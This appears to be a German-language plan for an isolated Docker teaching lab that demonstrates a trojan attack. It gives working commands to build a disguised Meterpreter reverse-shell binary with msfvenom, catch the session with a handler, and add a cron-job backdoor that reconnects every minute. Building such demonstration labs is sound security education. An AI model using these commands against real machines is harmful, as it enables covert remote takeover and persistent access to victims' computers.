# Plan: Szenario 2 — Trojaner einspielen (Meterpreter-Backdoor)

> Dies ist der **Entwurf/Plan** zur Abstimmung. Erst wenn wir beide zufrieden sind,
> baue ich daraus das lauffähige Szenario (docker-compose, Dockerfile, README) und teste es.

## Story / Lernziel

Ein Angreifer baut mit **msfvenom** eine harmlos aussehende Programmdatei (den „Trojaner"),
schleust sie auf den Rechner eines Mitarbeiters und bringt ihn dazu, sie auszufuehren.
In dem Moment baut der Trojaner eine **Reverse-Verbindung** zum Angreifer auf → volle Kontrolle
per Meterpreter. Anschliessend richtet der Angreifer eine **Persistenz (Backdoor)** ein, sodass
er auch nach Neustart / Schliessen der Sitzung jederzeit zurueckkommt.

Kernaussage fuer die Praesentation: **Nicht jeder Angriff braucht eine Software-Schwachstelle —
oft genuegt eine ausfuehrbare Datei + ein unvorsichtiger Klick (Social Engineering).**
Das ist bewusst der Kontrast zu Szenario 1 (dort: ungepatchte CVE).

## Architektur

```
┌──────────────────┐                         ┌──────────────────┐
│    attacker       │   1. msfvenom baut       │     victim        │
│  10.10.0.10       │      Trojaner            │  10.10.0.20       │
│  Metasploit       │                          │  Ubuntu (Mitarb.- │
│                   │   2. Datei kommt rueber  │  Workstation)     │
│  multi/handler    │  ───── /transfer ──────▶ │                   │
│  lauscht :4444    │     (geteilter Ordner)   │  ~/Downloads/      │
│                   │                          │   system-update    │
│                   │ ◀═══ 3. reverse_tcp ═════│  (Trojaner laeuft) │
│   Meterpreter-    │      Backdoor-Session    │                   │
│   Session (Root?) │                          │                   │
└──────────────────┘                         └──────────────────┘
                Docker-Netz: lab (10.10.0.0/24)
```

- **attacker**: gleiches Metasploit-Image wie Szenario 1, IP `10.10.0.10`.
- **victim**: schlankes **Ubuntu**-Image (kein verwundbarer Dienst noetig!) als „Mitarbeiter-Laptop",
  IP `10.10.0.20`. Enthaelt einen normalen User `mitarbeiter` und einen `~/Downloads`-Ordner.
- **Lieferweg**: ein **geteiltes Docker-Volume** `/transfer`, gemountet in beiden Containern.
  Es simuliert „E-Mail-Anhang / Download / USB-Stick" — der Weg, wie die Datei zum Opfer kommt.
  (Robust & ohne Zusatzdienste. Alternative s. u.)

## Geplanter Demo-Ablauf

### Schritt 1 — Trojaner bauen (Angreifer, msfconsole/Shell)
```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.0.10 LPORT=4444 \
         -f elf -o /transfer/system-update
```
- `msfvenom` = Payload-Generator von Metasploit
- erzeugt eine ELF-Binary, die beim Start „nach Hause telefoniert"
- Dateiname `system-update` = bewusst harmlos getarnt

### Schritt 2 — Handler starten (Angreifer, msfconsole)
```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.0.10
set LPORT 4444
run
```
Der Angreifer wartet jetzt auf die eingehende Verbindung.

### Schritt 3 — Opfer fuehrt den Trojaner aus
Der Vorfuehrende spielt den arglosen Mitarbeiter (separates Terminal):
```sh
docker exec -it trojan-victim su - mitarbeiter
cp /transfer/system-update ~/Downloads/ && chmod +x ~/Downloads/system-update
~/Downloads/system-update      # „Doppelklick"
```
→ Auf dem Angreifer poppt eine **Meterpreter-Session** auf.

### Schritt 4 — Kontrolle beweisen (Angreifer)
```
getuid
sysinfo
ps
```

### Schritt 5 — Persistenz / Backdoor einrichten
Damit der Zugang dauerhaft ist (= „Backdoor"), legt der Angreifer einen
**Cron-Job** an, der den Trojaner regelmaessig neu startet:
```
shell
(echo '* * * * * /home/mitarbeiter/Downloads/system-update') | crontab -
exit
```
Beweis: Session schliessen (`exit`/Session kill) → nach max. 1 Minute baut der
Cron-Job automatisch eine **neue** Session auf. Der Angreifer ist zurueck, ohne
dass das Opfer nochmal etwas tut.

### Schritt 6 — Aufraeumen
```sh
docker compose down -v
```

## Bewusste Design-Entscheidungen

1. **Keine CVE noetig** — Szenario 2 zeigt den „Mensch als Schwachstelle"-Vektor und
   ergaenzt damit Szenario 1 thematisch.
2. **Geteiltes Volume statt echtem Download** — maximal robust und ohne Internet/Extra-Dienst.
   *Optionale realistischere Variante:* `exploit/multi/script/web_delivery` oder ein kleiner
   HTTP-Server, von dem das Opfer per `wget` laedt. Kann ich als „Fortgeschritten"-Abschnitt
   ins README packen.
3. **Persistenz per Cron** — einfachste, gut sichtbare Backdoor-Technik. Alternative:
   Metasploit-Modul `post/linux/manage/sshkey_persistence` oder `exploit/linux/local/cron_persistence`.
4. **Victim laeuft als normaler User** `mitarbeiter` (nicht root) — realistischer.
   Root-Rechte waeren ein eigener Privilege-Escalation-Schritt (bewusst NICHT Teil dieses Szenarios,
   koennte aber als Ausblick erwaehnt werden).

## Geplante Dateien
```
szenario-2-trojaner-backdoor/
├── README.md            # Schritt-fuer-Schritt-Walkthrough (wie Szenario 1)
├── docker-compose.yml   # attacker (msf) + victim (ubuntu) + shared volume + lab-Netz
└── victim/
    └── Dockerfile       # Ubuntu + User "mitarbeiter" + cron + ~/Downloads
```

## Test-/Abnahmeplan (was ich nach dem Bauen automatisiert pruefe)
1. `docker compose up -d --build` → beide Container laufen.
2. msfvenom erzeugt die Datei in `/transfer`.
3. Handler laeuft, Opfer fuehrt Datei aus → Meterpreter-Session oeffnet sich.
4. `getuid`/`sysinfo` liefern plausible Werte.
5. Cron-Persistenz: Session killen → automatische Neu-Session innerhalb ~60 s.
6. README-Befehle 1:1 nachgestellt, alles fehlerfrei.

## Offene Fragen an dich
1. **Lieferweg**: geteiltes Volume (einfach/robust, empfohlen) — oder lieber den realistischeren
   HTTP-/`web_delivery`-Weg als Hauptvariante?
2. **Persistenz**: Cron-Backdoor wie geplant — oder ein dediziertes Metasploit-Persistenz-Modul?
3. **Victim-Base**: schlankes Ubuntu (empfohlen) — passt das, oder soll es eine andere Distro sein?
```
